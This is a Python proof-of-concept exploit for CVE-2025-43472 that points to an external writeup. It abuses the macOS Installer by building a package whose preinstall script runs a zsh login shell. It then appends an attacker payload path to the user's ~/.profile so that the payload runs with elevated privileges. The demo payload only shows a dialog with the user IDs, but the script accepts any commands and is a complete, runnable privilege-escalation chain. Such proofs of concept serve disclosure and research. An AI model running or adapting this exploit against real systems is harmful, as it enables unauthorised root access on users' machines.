"""
CVE-2025-43472. Writeup at https://mcrich23.com/posts/cve-2025-43472

exploit.py: Trigger PackageKit Exploit by creating a malicious '~/.profile' file
"""

import tempfile
import subprocess

from pathlib import Path


try:
    import macos_pkg_builder
except ImportError:
    print("[-] Failed to import 'macos_pkg_builder' module")
    print("[-] Please install the 'macos_pkg_builder' module")
    print("[-] 'pip3 install macos-pkg-builder'")
    exit(1)


PROFILE_FILE = Path.home() / ".profile"


class Exploit:
    def __init__(self, payload: list[str]):
        self.payload = payload
        self.payload_path = Path("/Users/Shared/payload.sh")
        self.pkg_path = None


    def _build_generic_pkg(self):
        """
        Build a generic PKG with ZSH preinstall script
        """
        preinstall_script = tempfile.NamedTemporaryFile(delete=False)
        preinstall_script.write(b"#!/bin/zsh -l \necho 'hello world'\n")
        preinstall_script.close()

        pkg_out = tempfile.NamedTemporaryFile(delete=False)

        assert macos_pkg_builder.Packages(
            pkg_output=pkg_out.name,
            pkg_preinstall_script=preinstall_script.name,
            pkg_bundle_id="com.malware.pkg",
        ).build() is True, "Failed to build PKG"

        self.pkg_path = Path(pkg_out.name)
        self.pkg_path.rename(self.pkg_path.with_suffix(".pkg"))
        self.pkg_path = self.pkg_path.with_suffix(".pkg")


    def _create_payload(self):
        """
        Create payload file and make it executable
        """
        with open(self.payload_path, "w") as f:
            f.write("\n".join(self.payload))
        subprocess.run(["/bin/chmod", "+x", self.payload_path])


    def _edit_profile(self):
        """
        Ensure payload path is present on its own line in '~/.profile'.
        Appends it if not already present.
        """
        payload_str = str(self.payload_path).strip()

        try:
            with open(PROFILE_FILE, "r") as f:
                lines = [line.strip() for line in f]
        except FileNotFoundError:
            lines = []

        if payload_str not in lines:
            with open(PROFILE_FILE, "a") as f:
                if lines and lines[-1] != "":
                    f.write("\n")  # Ensure newline before appending
                f.write(f"{payload_str}\n")


    def _open_pkg(self):
        """
        Open the pkg file
        """
        subprocess.run(["/usr/bin/open", self.pkg_path, "-a", "Installer"])


    def run(self):
        """
        Run the exploit
        """
        print("[*] Building generic PKG")
        self._build_generic_pkg()
        print(f"[*] Creating payload at {self.payload_path}")
        self._create_payload()
        print(f"[*] Editing {PROFILE_FILE}")
        self._edit_profile()
        print(f"[*] Opening {self.pkg_path.name}")
        self._open_pkg()


if __name__ == "__main__":
    payload = [
        "#!/bin/sh",
        """/usr/bin/osascript -e "display dialog \\"Hello from malware!\n\nCurrent user: $(/usr/bin/whoami)\nUID:  $UID\nEUID: $EUID\\"" """,
    ]
    exploit = Exploit(payload)
    exploit.run()
